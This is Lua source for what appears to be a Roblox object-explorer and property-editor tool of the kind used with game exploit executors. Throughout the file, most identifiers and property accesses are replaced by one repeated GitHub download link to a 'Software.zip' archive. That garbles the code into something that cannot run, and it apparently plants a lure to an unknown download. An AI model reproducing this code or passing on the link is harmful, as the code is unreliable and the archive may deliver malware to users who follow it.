					local relativeX = mouse.X - https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip
					if relativeX < 0 then relativeX = 0 end
					if relativeX > maxSize then relativeX = maxSize end

					local raw = relativeX/maxSize
					local fromColor = nil
					local toColor = nil
					for i,col in pairs(colors) do
						if col[2] >= raw then
							fromColor = colors[https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(i-1,1)]
							toColor = colors[i]
							break
						end
					end
					local lerpColor = fromColor[1]:lerp(toColor[1],(raw-fromColor[2])/(toColor[2]-fromColor[2]))
					local newPoint = {lerpColor,raw}
					newPoint[3] = placeArrow(newPoint[2],newPoint)
					https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(colors,newPoint)
					updateInputs(newPoint)
					buildSequence()
					redraw()
				end
			end)

			https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(function(input)
				if https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip == https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip then
					local maxSize = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip
					local relativeX = mouse.X - https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip
					if relativeX < 0 then relativeX = 0 end
					if relativeX > maxSize then relativeX = maxSize end
					https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = true
					https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0,10 + relativeX,0,0)
				end
			end)

			https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(function(input)
				if https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip == https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip then
					local inArrow = false
					for i,v in pairs(colors) do
						if https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(v[3]) then
							inArrow = v[3]
						end
					end
					https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = inArrow and true or false
					if inArrow then https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0,9 + https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip,0,0) end
				end
			end)

			timeBox:GetPropertyChangedSignal("Text"):Connect(function()
				local point = currentPoint
				local num = tonumber(https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip)
				if point and num and point ~= beginPoint and point ~= endPoint then
					num = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(num,0,1)
					point[2] = num
					buildSequence()
					redraw()
				end
			end)

			https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(function(input)
				if https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip == https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip then
					local editor = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip
					if not editor then
						editor = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip()
						https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip("ColorSequence Color Picker")

						https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(function(col)
							if currentPoint then
								currentPoint[1] = col
							end
							buildSequence()
							redraw()
						end)

						https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = editor
					end

					https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip()
				end
			end)

			https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(function()
				if currentPoint and currentPoint ~= beginPoint and currentPoint ~= endPoint then
					for i,v in pairs(colors) do
						if v == currentPoint then
							v[3]:Destroy()
							https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(colors,i)
							break
						end
					end
					currentlySelected = nil
					updateInputs(colors[1])
					buildSequence()
					redraw()
				end
			end)

			https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(function()
				if resetSequence then
					newMt:SetSequence(resetSequence)
				end
			end)

			https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(function()
				window:Close()
			end)

			https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(function()
				window:Close()
			end)

			buttonAnimations(deleteButton)
			buttonAnimations(resetButton)
			buttonAnimations(closeButton)

			placeArrows()
			redraw()

			https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = function(self)
				window:Show()
			end

			return newMt
		end

		return {new = new}
	end)()

	https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = (function()
		local textService = cloneref(game["Run Service"].Parent:GetService("TextService"))

		local props = {
			OffsetX = 0,
			TextBox = PH,
			CursorPos = -1,
			Gui = PH,
			View = PH
		}
		local funcs = {}
		https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = function(self)
			local cursorPos = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip or -1
			local text = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip
			if text == "" then https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0,0,0,0) return end
			if cursorPos == -1 then return end

			local cursorText = text:sub(1,cursorPos-1)
			local pos = nil
			local leftEnd = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip
			local rightEnd = leftEnd + https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip

			local totalTextSize = textService:GetTextSize(text,https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip,https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip,https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(999999999,100)).X
			local cursorTextSize = textService:GetTextSize(cursorText,https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip,https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip,https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(999999999,100)).X

			if cursorTextSize > rightEnd then
				pos = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(-1,cursorTextSize - https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip + 2)
			elseif cursorTextSize < leftEnd then
				pos = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(-1,cursorTextSize-2)
			elseif totalTextSize < rightEnd then
				pos = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(-1,totalTextSize - https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip + 2)
			end

			if pos then
				https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0,-pos,0,0)
				https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(1,pos,1,0)
			end
		end

		https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = function(self)
			return https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip
		end

		https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = function(self,text)
			https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = text
		end

		local mt = getGuiMT(props,funcs)

		local function convert(textbox)
			local obj = initObj(props,mt)

			local view = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip("Frame")
			https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip
			https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip
			https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip
			https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip
			https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip
			https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip
			https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = true
			https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip
			https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = 1
			https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0,0,0,0)
			https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(1,0,1,0)
			https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip
			https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = "Input"

			https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = textbox
			https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = view
			https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = view

			https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(function(prop)
				if prop == "Text" or prop == "CursorPosition" or prop == "AbsoluteSize" then
					local cursorPos = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip
					if cursorPos ~= -1 then https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = cursorPos end
					obj:Update()
				end
			end)

			obj:Update()

			https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip
			https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = view

			return obj
		end

		local function new()
			local textBox = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip("TextBox")
			https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0,100,0,20)
			https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip
			https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip
			https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = false
			https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip
			https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip
			https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = 14
			https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = ""
			return convert(textBox)
		end

		return {new = new, convert = convert}
	end)()

	https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = (function()
		local props,funcs = {},{}

		local mt = getGuiMT(props,funcs)

		local function new()
			local label = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip("TextLabel")
			https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = 1
			https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip
			https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip
			https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = 0.1
			https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0,100,0,20)
			https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip
			https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = 14

			local obj = setmetatable({
				Gui = label
			},mt)
			return obj
		end

		return {new = new}
	end)()

	https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = (function()
		local props,funcs = {},{}

		local mt = getGuiMT(props,funcs)

		local function new()
			local fr = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip("Frame")
			https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip
			https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip
			https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0,50,0,50)

			local obj = setmetatable({
				Gui = fr
			},mt)
			return obj
		end

		return {new = new}
	end)()

	https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = (function()
		local props = {
			Gui = PH,
			Anim = PH,
			Disabled = false,
			OnClick = SIGNAL,
			OnDown = SIGNAL,
			OnUp = SIGNAL,
			AllowedButtons = {1}
		}
		local funcs = {}
		local tableFind = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip

		https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = function(self,event,button)
			if not https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip and tableFind(https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip,button) then
				self["On"https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip]:Fire(button)
			end
		end

		https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = function(self,dis)
			https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = dis

			if dis then
				https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip()
				https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = 0.5
			else
				https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip()
				https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = 0
			end
		end

		local mt = getGuiMT(props,funcs)

		local function new()
			local b = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip("TextButton")
			https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = false
			https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip
			https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = 0.1
			https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0,100,0,20)
			https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip
			https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = 14
			https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip
			https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip

			local obj = initObj(props,mt)
			https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = b
			https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(b,{Mode = 2, StartColor = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip, HoverColor = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip, PressColor = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip, OutlineColor = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip})

			https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(function() obj:Trigger("Click",1) end)
			https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(function() obj:Trigger("Down",1) end)
			https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(function() obj:Trigger("Up",1) end)

			https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(function() obj:Trigger("Click",2) end)
			https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(function() obj:Trigger("Down",2) end)
			https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(function() obj:Trigger("Up",2) end)

			return obj
		end

		return {new = new}
	end)()

	https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = (function()
		local props = {
			Gui = PH,
			Anim = PH,
			Context = PH,
			Selected = PH,
			Disabled = false,
			CanBeEmpty = true,
			Options = {},
			GuiElems = {},
			OnSelect = SIGNAL
		}
		local funcs = {}

		https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = function(self)
			local options = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip

			if #options > 0 then
				if not https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip then
					if not https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip then
						https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = options[1]
						https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = options[1]
					else
						https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = "- Select -"
					end
				else
					https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip
				end
			else
				https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = "- Select -"
			end
		end

		https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = function(self)
			local context = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip

			https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip
			https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip
			context:Show(https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip, https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip + https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip)
		end

		https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = function(self,opts)
			https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = opts

			local context = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip
			local options = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip
			context:Clear()

			local onClick = function(option) https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = option https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(option) self:Update() end

			if https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip then
				context:Add({Name = "- Select -", OnClick = function() https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = nil https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(nil) self:Update() end})
			end

			for i = 1,#options do
				context:Add({Name = options[i], OnClick = onClick})
			end

			self:Update()
		end

		https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = function(self,opt)
			https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = type(opt) == "number" and https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip[opt] or opt
			self:Update()
		end

		local mt = getGuiMT(props,funcs)

		local function new()
			local f = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip("TextButton")
			https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = false
			https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = ""
			https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0,100,0,20)
			https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip
			https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip

			local label = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip()
			https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0,2,0,0)
			https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(1,-22,1,0)
			https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip
			https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = f
			local arrow = create({
				{1,"Frame",{BackgroundTransparency=1,Name="EnumArrow",https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(1,-16,0,2),https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0,16,0,16),}},
				{2,"Frame",{https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0.86274510622025,0.86274510622025,0.86274510622025),BorderSizePixel=0,Parent={1},https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0,8,0,9),https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0,1,0,1),}},
				{3,"Frame",{https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0.86274510622025,0.86274510622025,0.86274510622025),BorderSizePixel=0,Parent={1},https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0,7,0,8),https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0,3,0,1),}},
				{4,"Frame",{https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0.86274510622025,0.86274510622025,0.86274510622025),BorderSizePixel=0,Parent={1},https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0,6,0,7),https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0,5,0,1),}},
			})
			https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = f

			local obj = initObj(props,mt)
			https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = f
			https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(f,{Mode = 2, StartColor = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip, LerpTo = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip, LerpDelta = 0.15})
			https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip()
			https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = true
			https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = 200
			https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = nil
			https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = {Label = label}
			https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(function() obj:ShowOptions() end)
			obj:Update()
			return obj
		end

		return {new = new}
	end)()

	https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = (function()
		local props = {
			LastItem = PH,
			OnDown = SIGNAL,
			OnRelease = SIGNAL,
			AllowedButtons = {1},
			Combo = 0,
			MaxCombo = 2,
			ComboTime = 0.5,
			Items = {},
			ItemCons = {},
			ClickId = -1,
			LastButton = ""
		}
		local funcs = {}
		local tostring = tostring

		local disconnect = function(con)
			local pos = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip,con)
			if pos then https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip,pos) end
		end

		https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = function(self,item,button)
			if https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip,button) then
				if https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip ~= button or https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip ~= item or https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip == https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip or tick() - https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip > https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip then
					https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = 0
					https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = button
					https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = item
				end
				https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip + 1
				https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = tick()

				local release
				release = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(function(input)
					if https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip == https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip["MouseButton"https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip] then
						release:Disconnect()
						if https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(item) and https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip == button and https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip == item then
							self["OnRelease"]:Fire(item,https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip,button)
						end
					end
				end)

				self["OnDown"]:Fire(item,https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip,button)
			end
		end

		https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = function(self,item)
			if https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip,item) then return end

			local cons = {}
			cons[1] = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(function() self:Trigger(item,1) end)
			cons[2] = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(function() self:Trigger(item,2) end)

			https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip[item] = cons
			https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip[https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip+1] = item
		end

		https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = function(self,item)
			local ind = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip,item)
			if not ind then return end

			for i,v in pairs(https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip[item]) do
				v:Disconnect()
			end
			https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip[item] = nil
			https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip,ind)
		end

		local mt = {__index = funcs}

		local function new()
			local obj = initObj(props,mt)

			return obj
		end

		return {new = new}
	end)()

	return Lib
end

return {InitDeps = initDeps, InitAfterMain = initAfterMain, Main = main}
end
}

-- Main vars
local Main, Explorer, Properties, ScriptViewer, DefaultSettings, Notebook, Serializer, Lib
local API, RMD

-- Default Settings
DefaultSettings = (function()
	local rgb = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip
	return {
		Explorer = {
			_Recurse = true,
			Sorting = true,
			TeleportToOffset = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0,0,0),
			ClickToRename = true,
			AutoUpdateSearch = true,
			AutoUpdateMode = 0, -- 0 Default, 1 no tree update, 2 no descendant events, 3 frozen
			PartSelectionBox = true,
			GuiSelectionBox = true,
			CopyPathUseGetChildren = true
		},
		Properties = {
			_Recurse = true,
			MaxConflictCheck = 50,
			ShowDeprecated = false,
			ShowHidden = false,
			ClearOnFocus = false,
			LoadstringInput = true,
			NumberRounding = 3,
			ShowAttributes = false,
			MaxAttributes = 50,
			ScaleType = 1 -- 0 Full Name Shown, 1 Equal Halves
		},
		Theme = {
			_Recurse = true,
			Main1 = rgb(52,52,52),
			Main2 = rgb(45,45,45),
			Outline1 = rgb(33,33,33), -- Mainly frames
			Outline2 = rgb(55,55,55), -- Mainly button
			Outline3 = rgb(30,30,30), -- Mainly textbox
			TextBox = rgb(38,38,38),
			Menu = rgb(32,32,32),
			ListSelection = rgb(11,90,175),
			Button = rgb(60,60,60),
			ButtonHover = rgb(68,68,68),
			ButtonPress = rgb(40,40,40),
			Highlight = rgb(75,75,75),
			Text = rgb(255,255,255),
			PlaceholderText = rgb(100,100,100),
			Important = rgb(255,0,0),
			ExplorerIconMap = "",
			MiscIconMap = "",
			Syntax = {
				Text = rgb(204,204,204),
				Background = rgb(36,36,36),
				Selection = rgb(255,255,255),
				SelectionBack = rgb(11,90,175),
				Operator = rgb(204,204,204),
				Number = rgb(255,198,0),
				String = rgb(173,241,149),
				Comment = rgb(102,102,102),
				Keyword = rgb(248,109,124),
				Error = rgb(255,0,0),
				FindBackground = rgb(141,118,0),
				MatchingWord = rgb(85,85,85),
				BuiltIn = rgb(132,214,247),
				CurrentLine = rgb(45,50,65),
				LocalMethod = rgb(253,251,172),
				LocalProperty = rgb(97,161,241),
				Nil = rgb(255,198,0),
				Bool = rgb(255,198,0),
				Function = rgb(248,109,124),
				Local = rgb(248,109,124),
				Self = rgb(248,109,124),
				FunctionName = rgb(253,251,172),
				Bracket = rgb(204,204,204)
			},
		}
	}
end)()

-- Vars
local Settings = {}
local Apps = {}
local env = {}
local service = setmetatable({},{__index = function(self,name)
	local serv = cloneref(game["Run Service"].Parent:GetService(name))
	self[name] = serv
	return serv
end})
local plr = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip or https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip()

local create = function(data)
	local insts = {}
	for i,v in pairs(data) do insts[v[1]] = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(v[2]) end
	
	for _,v in pairs(data) do
		for prop,val in pairs(v[3]) do
			if type(val) == "table" then
				insts[v[1]][prop] = insts[val[1]]
			else
				insts[v[1]][prop] = val
			end
		end
	end
	
	return insts[1]
end

local createSimple = function(class,props)
	local inst = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(class)
	for i,v in next,props do
		inst[i] = v
	end
	return inst
end

